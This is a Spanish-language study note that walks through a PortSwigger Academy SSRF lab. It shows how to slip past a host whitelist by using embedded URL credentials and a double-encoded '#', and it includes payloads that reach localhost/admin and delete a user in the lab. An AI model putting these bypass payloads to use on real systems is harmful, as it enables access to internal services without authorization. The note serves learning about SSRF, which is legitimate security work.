---
aliases:
  - SSRF 004 - bypass whitelist
  - ssrf whitelist filter
  - embedded credentials bypass
tags:
  - vuln/ssrf
  - example
  - portswigger
---

# 004 — Saltar una whitelist (credenciales embebidas + `#`)

> Lab: [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter) · **Expert** · técnica → [[vulnerabilities/007-ssrf/ssrf|entry point]]

## ¿Por qué acá?
- **Vengo de [[vulnerabilities/007-ssrf/examples/003-bypass-blacklist-variantes-localhost|003]]:** ahí bastaba una **representación alternativa** porque el filtro bloqueaba "malos conocidos".
- **Por qué no me alcanza 003:** acá es al revés — **solo se permite `stock.weliketoshop.net`**. `127.1`, decimal, `[::1]`… **ninguna pasa**, porque no están en la whitelist. No hay "otra forma del host": el host tiene que *parecer* el permitido.
- **Entonces:** exploto el **parseo inconsistente** de URLs: hago que el **validador vea el dominio permitido** pero el **cliente HTTP conecte a `localhost`**.

## Cómo explotarlo (escalones)

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/IP) + el **payload** del ataque (URL interna / Referer / User-Agent).

**1. Credenciales embebidas** — lo de antes del `@` es usuario, no host:
<pre class="payload"><code>stockApi=<mark>http://username@stock.weliketoshop.net/</mark>   ← aceptado
stockApi=<mark>http://localhost@stock.weliketoshop.net/</mark>  ← "localhost" como usuario</code></pre>

**2. Cortar con `#`** para que el host real sea `localhost` y el dominio quede en el fragmento:
<pre class="payload"><code>stockApi=<mark>http://localhost#@stock.weliketoshop.net/</mark></code></pre>

**3. Doble-encode del `#`** (`#` → `%23` → `%2523`) para engañar la validación:
<pre class="payload"><code>POST /product/stock HTTP/1.1
Host: <mark>LAB.web-security-academy.net</mark>
Content-Type: application/x-www-form-urlencoded

stockApi=<mark>http://localhost:80%2523@stock.weliketoshop.net/admin</mark></code></pre>
Confirmado el panel:
<pre class="payload"><code>stockApi=<mark>http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</mark></code></pre>

## Verificación
El validador ve `stock.weliketoshop.net` (whitelisted) y deja pasar; el cliente conecta a **`localhost`** y devuelve el **panel admin** → carlos borrado.

## Detalles que se pasan por alto
- La gracia es la **discrepancia validador ↔ cliente HTTP** al parsear la URL. `%2523` decodifica a `#` en el momento justo.
- Otras piezas del mismo truco: **`#`** (fragmento), **`?`** (query), **sub-dominio** `localhost.stock.weliketoshop.net` si el filtro hace "contiene X".
- Es **Expert** aunque el objetivo (`localhost/admin`) sea el mismo que [[vulnerabilities/007-ssrf/examples/001-ssrf-directo-localhost|001]]: lo difícil es **el parser**, no el destino.

→ Siguiente: [[vulnerabilities/007-ssrf/examples/005-bypass-open-redirect|005 · y si no puedo falsear el host de ninguna forma?]]
